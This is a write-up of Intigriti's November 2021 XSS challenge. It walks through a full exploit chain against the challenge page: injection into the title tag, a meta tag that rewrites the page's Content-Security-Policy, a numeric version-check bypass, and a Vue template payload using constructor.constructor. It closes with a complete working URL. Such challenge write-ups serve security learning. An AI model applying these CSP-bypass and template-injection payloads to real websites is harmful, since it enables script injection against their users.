# Intigriti's November XSS challenge (challenge-1121)

**Challenge author** : https://twitter.com/IvarsVids  

**Challenge information link** : https://challenge-1121.intigriti.io/  

This was a fun XSS challenge that made me waste my whole day full of responsibilities, though it was worth it after all :)

## 0. Start

We start by heading to the challenge [here](https://challenge-1121.intigriti.io/challenge/index.php?s=).  
We only have one input which is the search box, and our search is reflected in the `s` GET parameter.  
Let's check out the HTML source :

```html
<html>
<head>
	<title>You searched for ''</title>
	<script nonce="70b52d1b524e05fd3a53b7a55c1e83e6">
		var isProd = true;
	</script>
	<script nonce="70b52d1b524e05fd3a53b7a55c1e83e6">
		function addJS(src, cb){
			let s = document.createElement('script');
			s.src = src;
			s.onload = cb;
			let sf = document.getElementsByTagName('script')[0];
    			sf.parentNode.insertBefore(s, sf);
		}
		
		function initVUE(){
			if (!window.Vue){
				setTimeout(initVUE, 100);
			}
			new Vue({
				el: '#app',
				delimiters: window.delimiters,
				data: {
					"owasp":[
						{"target": "1", "title":"A01:2021-Broken Access Control","description":" moves up from the fifth position to the category with the most serious web application security risk; the contributed data indicates that on average, 3.81% of applications tested had one or more Common Weakness Enumerations (CWEs) with more than 318k occurrences of CWEs in this risk category. The 34 CWEs mapped to Broken Access Control had more occurrences in applications than any other category."},
						{"target": "2", "title":"A02:2021-Cryptographic Failures","description":" shifts up one position to #2, previously known as A3:2017-Sensitive Data Exposure, which was broad symptom rather than a root cause. The renewed name focuses on failures related to cryptography as it has been implicitly before. This category often leads to sensitive data exposure or system compromise."},
						{"target": "3", "title":"A03:2021-Injection","description":" slides down to the third position. 94% of the applications were tested for some form of injection with a max incidence rate of 19%, an average incidence rate of 3.37%, and the 33 CWEs mapped into this category have the second most occurrences in applications with 274k occurrences. Cross-site Scripting is now part of this category in this edition."},
						{"target": "4", "title":"A04:2021-Insecure Design","description":" is a new category for 2021, with a focus on risks related to design flaws. If we genuinely want to \"move left\" as an industry, we need more threat modeling, secure design patterns and principles, and reference architectures. An insecure design cannot be fixed by a perfect implementation as by definition, needed security controls were never created to defend against specific attacks."},
						{"target": "5", "title":"A05:2021-Security Misconfiguration","description":" moves up from #6 in the previous edition; 90% of applications were tested for some form of misconfiguration, with an average incidence rate of 4.5%, and over 208k occurrences of CWEs mapped to this risk category. With more shifts into highly configurable software, it's not surprising to see this category move up. The former category for A4:2017-XML External Entities (XXE) is now part of this risk category."},
						{"target": "6", "title":"A06:2021-Vulnerable","description":" and Outdated Components was previously titled Using Components with Known Vulnerabilities and is #2 in the Top 10 community survey, but also had enough data to make the Top 10 via data analysis. This category moves up from #9 in 2017 and is a known issue that we struggle to test and assess risk. It is the only category not to have any Common Vulnerability and Exposures (CVEs) mapped to the included CWEs, so a default exploit and impact weights of 5.0 are factored into their scores."},
						{"target": "7", "title":"A07:2021-Identification and Authentication Failures","description":" was previously Broken Authentication and is sliding down from the second position, and now includes CWEs that are more related to identification failures. This category is still an integral part of the Top 10, but the increased availability of standardized frameworks seems to be helping."},
						{"target": "8", "title":"A08:2021-Software and Data Integrity Failures","description":" is a new category for 2021, focusing on making assumptions related to software updates, critical data, and CI/CD pipelines without verifying integrity. One of the highest weighted impacts from Common Vulnerability and Exposures/Common Vulnerability Scoring System (CVE/CVSS) data mapped to the 10 CWEs in this category. A8:2017-Insecure Deserialization is now a part of this larger category."},
						{"target": "9", "title":"A09:2021-Security Logging and Monitoring Failures","description":" was previously A10:2017-Insufficient Logging & Monitoring and is added from the Top 10 community survey (#3), moving up from #10 previously. This category is expanded to include more types of failures, is challenging to test for, and isn't well represented in the CVE/CVSS data. However, failures in this category can directly impact visibility, incident alerting, and forensics."},
						{"target": "10", "title":"A10:2021-Server-Side Request Forgery","description":" is added from the Top 10 community survey (#1). The data shows a relatively low incidence rate with above average testing coverage, along with above-average ratings for Exploit and Impact potential. This category represents the scenario where the security community members are telling us this is important, even though it's not illustrated in the data at this time."},
						].filter(e=>{
							return (e.title + ' - ' + e.description)
								.includes(new URL(location).searchParams.get('s')|| ' ');
						}),
					"search": new URL(location).searchParams.get('s')
				}
			})
		}
	</script>
	<script nonce="70b52d1b524e05fd3a53b7a55c1e83e6">
		var delimiters = ['v-{{', '}}'];
		addJS('./vuejs.php', initVUE);
	</script>
	<script nonce="70b52d1b524e05fd3a53b7a55c1e83e6">
		if (!window.isProd){
			let version = new URL(location).searchParams.get('version') || '';
			version = version.slice(0,12);
			let vueDevtools = new URL(location).searchParams.get('vueDevtools') || '';
			vueDevtools = vueDevtools.replace(/[^0-9%a-z/.]/gi,'').replace(/^\/\/+/,'');

			if (version === 999999999999){
				setTimeout(window.legacyLogger, 1000);
			} else if (version > 1000000000000){
				addJS(vueDevtools, window.initVUE);
			} else{
				console.log(performance)
			}
		}
	</script>
    <style>
        body {
            color: #b7b7b7;;
            text-align: center;
            background: #262a2b;
            font-family: 'helvetica', san-serif;
        }
        .tilesWrap {
            padding: 0;
            margin: 50px auto;
            list-style: none;
            text-align: center;
        }
        .tilesWrap li {
            display: inline-block;
            width: 20%;
            min-width: 200px;
            max-width: 230px;
            padding: 80px 20px 40px;
            position: relative;
            vertical-align: top;
            margin: 10px;
            font-family: 'helvetica', san-serif;
            min-height: 25vh;
            background: #262a2b;
            border: 1px solid #252727;
            text-align: left;
        }
        .tilesWrap li h2 {
            font-size: 114px;
            margin: 0;
            position: absolute;
            opacity: 0.2;
            top: 50px;
            right: 10px;
            transition: all 0.3s ease-in-out;
        }
        .tilesWrap li strong {
            font-size: 20px;
            color: #b7b7b7;
            margin-bottom: 5px;
        }
        .tilesWrap li p {
            font-size: 16px;
            line-height: 18px;
            color: #b7b7b7;
            margin-top: 5px;
        }
        .tilesWrap li a {
            background: transparent;
            border: 1px solid #b7b7b7;
            padding: 10px 20px;
            color: #b7b7b7;
            border-radius: 3px;
            position: relative;
            transition: all 0.3s ease-in-out;
            transform: translateY(-40px);
            opacity: 0;
            cursor: pointer;
            overflow: hidden;
            display: inline-block;
            z-index: 1;
            text-decoration: none;
        }
        .tilesWrap li a:before {
            content: '';
            position: absolute;
            height: 100%;
            width: 120%;
            background: #b7b7b7;
            top: 0;
            opacity: 0;
            left: -140px;
            border-radius: 0 20px 20px 0;
            z-index: -1;
            transition: all 0.3s ease-in-out;
        }
        .tilesWrap li:hover a {
            transform: translateY(5px);
            opacity: 1;
        }
        .tilesWrap li button:hover {
            color: #262a2b;
        }
        .tilesWrap li a:hover:before {
            left: 0;
            opacity: 1;
        }
        .tilesWrap li:hover h2 {
            top: 0px;
            opacity: 0.6;
        }
        .tilesWrap li:before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            z-index: -1;
            background: #fff;
            transform: skew(2deg, 2deg);
        }
        .tilesWrap li:after {
            content: '';
            position: absolute;
            width: 40%;
            height: 100%;
            left: 0;
            top: 0;
            background: rgba(255, 255, 255, 0.02);
        }
        .tilesWrap li:nth-child(1):before {
            background: #C9FFBF;
            background: -webkit-linear-gradient(to right, #FFAFBD, #C9FFBF);
            background: linear-gradient(to right, #FFAFBD, #C9FFBF);
        }
        .tilesWrap li:nth-child(2):before {
            background: #f2709c;
            background: -webkit-linear-gradient(to right, #ff9472, #f2709c);
            background: linear-gradient(to right, #ff9472, #f2709c);
        }
        .tilesWrap li:nth-child(3):before {
            background: #c21500;
            background: -webkit-linear-gradient(to right, #ffc500, #c21500);
            background: linear-gradient(to right, #ffc500, #c21500);
        }
        .tilesWrap li:nth-child(4):before {
            background: #FC354C;
            background: -webkit-linear-gradient(to right, #0ABFBC, #FC354C);
            background: linear-gradient(to right, #0ABFBC, #FC354C);
        }
        .tilesWrap li:nth-child(5):before {
            background: #C9FFBF;
            background: -webkit-linear-gradient(to right, #FFAFBD, #C9FFBF);
            background: linear-gradient(to right, #FFAFBD, #C9FFBF);
        }
        .tilesWrap li:nth-child(6):before {
            background: #f2709c;
            background: -webkit-linear-gradient(to right, #ff9472, #f2709c);
            background: linear-gradient(to right, #ff9472, #f2709c);
        }
        .tilesWrap li:nth-child(7):before {
            background: #c21500;
            background: -webkit-linear-gradient(to right, #ffc500, #c21500);
            background: linear-gradient(to right, #ffc500, #c21500);
        }
        .tilesWrap li:nth-child(8):before {
            background: #FC354C;
            background: -webkit-linear-gradient(to right, #0ABFBC, #FC354C);
            background: linear-gradient(to right, #0ABFBC, #FC354C);
        }
        .tilesWrap li:nth-child(9):before {
            background: #C9FFBF;
            background: -webkit-linear-gradient(to right, #FFAFBD, #C9FFBF);
            background: linear-gradient(to right, #FFAFBD, #C9FFBF);
        }
        .tilesWrap li:nth-child(10):before {
            background: #f2709c;
            background: -webkit-linear-gradient(to right, #ff9472, #f2709c);
            background: linear-gradient(to right, #ff9472, #f2709c);
        }
    </style>
</head>
<body>
<div id="app">
<form action="" method="GET">
<input type="text "name="s" v-model="search"/>
<input type="submit" value="🔍">
</form>
<p>You searched for v-{{search}}</p>
<ul class="tilesWrap">
  <li v-for="item in owasp">
    <h2>v-{{item.target}}</h2>
    <h3>v-{{item.title}}</h3>
    <p>v-{{item.description}}</p>
    <p>
      <a v-bind:href="'https://blog.intigriti.com/2021/09/10/owasp-top-10/#'+item.target" target="blog" class="readMore">Read more</a>
    </p>
  </li>
</ul>
</div>
</body>
</html>
```

There's a good bunch of JavaScript script tags and we can notice that the site is using the Vue.js framework, and it's changing the default delimiters for client-side templates from `{{` and `}}` to `v-{{` and `}}`.  
We can also notice that our input gets rendered by Vue in this tag :  

```html
<p>You searched for v-{{search}}</p>
```

## 1. Injection point

Unfortunately, I spent a lot of time on this because I was focusing on "somehow" injecting HTML in `v-{{search}}` although it is fully escaped by Vue.  
Then, by sheer luck, I used curl to see where my input is reflected (while totally forgetting that Vue renders elements dynamically, :smh:), only to see that it is mirrored in the page's title.  
For example, if `s=test`, then it gets injected in the title like this :  

```html
<title>You searched for 'test'</title>
```

Cool ! So now we can just inject a script tag and call it a day, right ? Well, of course not !

## 2. Bypassing CSP (more like enforcing it even more)

The server sets the following content security policy (nonce is randomly generated for each request of course) :  
```
base-uri 'self'; default-src 'self'; script-src 'unsafe-eval' 'nonce-32b3c71d27b9db5e3579fddb607c6afb' 'strict-dynamic'; object-src 'none'; style-src 'sha256-dpZAgKnDDhzFfwKbmWwkl1IEwmNIKxUv+uw+QP89W3Q='
```
The `script-src` directive is the only relevant piece for us :
- `unsafe-eval` : allows using eval and similar methods
- `nonce-...` : only inline scripts that contain that nonce will be allowed to be executed
- `strict-dynamic` : (I think) scripts that are dynamically created by scripts that are already allowed to be executed (nonce or hash are valid) can also be executed

This means that we cannot simply add our own script tags and expect them to be executed, they need to have a `nonce` attribute with the correct nonce value (which we cannot guess).  

When we look through the page's code, we see an interesting script loaded :

```html
  <script nonce="17dba0432d6a35076a8913691679a557">
		if (!window.isProd){
			let version = new URL(location).searchParams.get('version') || '';
			version = version.slice(0,12);
			let vueDevtools = new URL(location).searchParams.get('vueDevtools') || '';
			vueDevtools = vueDevtools.replace(/[^0-9%a-z/.]/gi,'').replace(/^\/\/+/,'');

			if (version === 999999999999){
				setTimeout(window.legacyLogger, 1000);
			} else if (version > 1000000000000){
				addJS(vueDevtools, window.initVUE);
			} else{
				console.log(performance)
			}
		}
	</script>
```

But `window.isProd` is always set to true by this script :

```html
  <script nonce="17dba0432d6a35076a8913691679a557">
		var isProd = true;
	</script>
```

My first thought was to maybe use the injection we already have to perform DOM clobbering in the hopes of making `!window.isProd` return `true`. But I failed (or something).  
But looking at how `style-src` directive is set to a `sha256` value, I thought : since we can inject HTML in the `head`, can we update CSP using the `meta` http-equiv directive so that only specific inline scripts are loaded  ? (This was not directly my thought process, I'm just trying to simplify the write-up).  
Anyway, I started calculating hashes for inline scripts I wanted to include using [this website here](https://csplite.com/csp/sha/).  
Since it is easier to lay out the scripts that I excluded, here they are :

1. We obviously want to exclude the following script so that `window.isProd` returns `undefined`, which makes `!window.isProd` evaluate to `true` :

```html
  <script nonce="17dba0432d6a35076a8913691679a557">
		var isProd = true;
	</script>
```

2. We'll get to why I excluded the script below later :

```html
  <script nonce="17dba0432d6a35076a8913691679a557">
		var delimiters = ['v-{{', '}}'];
		addJS('./vuejs.php', initVUE);
	</script>
```

The CSP policies I want to enforce are described like this :  `<meta http-equiv="Content-Security-Policy" content="script-src * 'unsafe-eval' 'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz+oz+CtD7RE4=' 'sha256-Tz/iYFTnNe0de6izIdG+o6Xitl18uZfQWapSbxHE6Ic='">`
- `*` : a script can be loaded from any URL (except a few schemes), this is needed because [Vue.js](https://unpkg.com/vue) needs to be loaded (we'll see why soon)
- `unsafe-eval` : this is also needed because actual Vue code uses eval and similar methods to render pages
- `sha256-...` : the sha256 hashes of the two inline scripts I allowed

By sending the following as the `s` GET parameter (URL encoded of course) :  

```html
</title>
<meta http-equiv="Content-Security-Policy" content="script-src * 'unsafe-eval' 'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz+oz+CtD7RE4=' 'sha256-Tz/iYFTnNe0de6izIdG+o6Xitl18uZfQWapSbxHE6Ic='">
```

We see in the browser console that CSP only allows the two scripts we allowed (the one defining `addJS` and `initVUE` functions and the one containing the `!window.isProd` check).  
Though since we blocked the second script, the following line is not executed :

```javascript
addJS('./vuejs.php', initVUE);
```

And `/vuejs.php` actually just redirects to the [Vue.js source](https://unpkg.com/vue), so that means Vue.js won't be loaded.

### Bypassing WAF

I know this write-up looks messy and the ideas are just being thrown around, but please bear with me because we need to talk about the Web App Firewall.  
Anyway, although our input gets reflected in the title, there are some characters that are sort of filtered, for example `:` is transformed into `%:%`, `-` into `%-%` and `is` into `i%s`, etc...  
And honestly after trying various payloads, I couldn't bypass the WAF so my final solution had to just use characters that aren't modified.  
For example if `-` was left as is, I wouldn't have had to block the script that sets delimiters and adds Vue.js, I could've simply injected `v-{{JS_CODE_HERE}}` in an element to be rendered by Vue.  
Instead, since the second script is blocked, the delimiters would still be `{{` and `}}` which aren't transformed by the WAF, so using the script that contains the `if (!window.isProd)` check, I should try to load Vue.js by also passing the `if (version > 1000000000000)` check and reaching `addJS(vueDevtools, window.initVUE)` (while trying to set `vueDevtools` to `vuejs.php` of course).  

#### Bypassing the version check

Code relevant to getting the `version` :

```javascript
let version = new URL(location).searchParams.get('version') || '';
version = version.slice(0,12);
```

`version` is taken from URL query parameters and only 12 first characters are considered.  
The first check is `version === 999999999999`, it can obviously never be true since `version` is always a string (unless JavaScript is weirder than I think).  
Then the next check is `version > 1000000000000`, since JavaScript happily compares strings to numbers by converting the string to a number, this should be possible to bypass.  
But wait ! "1000000000000" is 13 characters long ! How can we pass the check if `version` can be 12 characters long only ? Well, if we pass "9e9999999999" as a version, JavaScript will try to convert it like this : `Number("9e9999999999")`, and since this is a valid exponential form of a number, the result will be `Infinity` !  
And it is trivial that `Infinity > 1000000000000` !  

Now for the other parameter `vueDevtools`, I tried a lot of things to bypass this filter so I can load external scripts :

```javascript
vueDevtools = vueDevtools.replace(/[^0-9%a-z/.]/gi,'').replace(/^\/\/+/,'');
```

But no luck.  

Though, remember the idea I was mentioning a few paragraphs ago :  
> Instead, since the second script is blocked, the delimiters would still be `{{` and `}}` which aren't transformed by the WAF, so using the script that contains the `if (!window.isProd)` check, I should try to load Vue.js by also passing the `if (version > 1000000000000)` check and reaching `addJS(vueDevtools, window.initVUE)` (while trying to set `vueDevtools` to `vuejs.php` of course).  

Let's simply set vueDevtools to `vuejs.php` so we can load Vue.js, and by putting our JavaScript between `{{` and `}}`, Vue will happily render it.  
Now Vue is kind of tricky when it comes to accessing elements outside of its scope (or whatever you call it), but here's a working payload to trigger an `alert(document.domain)` using Vue templating :  

```html
{{constructor.constructor('alert(document.domain)')()}}
```

We shouldn't forget to put our template payload in a div with `id="app"`, else it wouldn't be loaded by Vue.  
The final payload (`s` parameter) looks like this (but again, URL encoded of course) :  

```html
</title>
<meta http-equiv="Content-Security-Policy" content="script-src * 'unsafe-eval' 'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz+oz+CtD7RE4=' 'sha256-Tz/iYFTnNe0de6izIdG+o6Xitl18uZfQWapSbxHE6Ic='">
</head>
<body>
<div id="app">
<h1>{{constructor.constructor('alert(document.domain)')()}}</h1>
</div>
</body>
<head>
<title>'
```

This is the full URL that triggers the alert : https://challenge-1121.intigriti.io/challenge/index.php?s=%3C%2Ftitle%3E%0A%3Cmeta+http-equiv%3D%22Content-Security-Policy%22+content%3D%22script-src+%2A+%27unsafe-eval%27+%27sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2Boz%2BCtD7RE4%3D%27+%27sha256-Tz%2FiYFTnNe0de6izIdG%2Bo6Xitl18uZfQWapSbxHE6Ic%3D%27%22%3E%0A%3C%2Fhead%3E%0A%3Cbody%3E%0A%3Cdiv+id%3D%22app%22%3E%0A%3Ch1%3E%7B%7Bconstructor.constructor%28%27alert%28document.domain%29%27%29%28%29%7D%7D%3C%2Fh1%3E%0A%3C%2Fdiv%3E%0A%3C%2Fbody%3E%0A%3Chead%3E%0A%3Ctitle%3E%27&version=9e9999999999&vueDevtools=vuejs.php
